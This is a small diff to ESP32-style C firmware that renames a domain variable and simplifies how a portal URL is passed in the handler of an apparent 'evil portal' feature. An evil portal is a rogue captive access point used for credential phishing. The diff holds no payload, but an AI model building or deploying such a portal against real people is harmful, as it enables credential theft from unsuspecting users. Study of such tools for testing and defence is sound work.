@@ -40,7 +40,7 @@ uint16_t ap_count;
 wifi_ap_record_t* scanned_aps;
 const char *TAG = "WiFiManager";
 char* PORTALURL = "";
-char* DOMAIN = "";
+char* domain_str = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
@@ -601,11 +601,8 @@ esp_err_t file_handler(httpd_req_t *req) {
 esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
 
-    
-    const char *portal_url = PORTALURL;
 
-
-    esp_err_t err = stream_data_to_client(req, portal_url, "text/html");
+    esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");
     
     if (err != ESP_OK) {
         const char *err_msg = esp_err_to_name(err);
@@ -785,7 +782,7 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
     if (strlen(URL) > 0 && strlen(domain) > 0)
     {
         PORTALURL = URL;
-        DOMAIN = domain;
+        domain_str = domain;
     }
 
     ap_manager_stop_services();
